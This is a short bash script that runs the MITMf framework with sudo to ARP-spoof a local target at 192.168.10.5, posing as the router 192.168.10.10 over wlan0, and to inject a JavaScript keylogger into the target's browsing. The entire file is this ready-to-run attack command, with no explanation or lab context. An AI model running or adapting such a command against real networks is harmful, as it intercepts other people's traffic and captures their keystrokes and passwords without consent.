#!/bin/bash

sudo python mitmf.py --arpspoof --iface wlan0 --routerip 192.168.10.10 --target 192.168.10.5 --jskeylogger
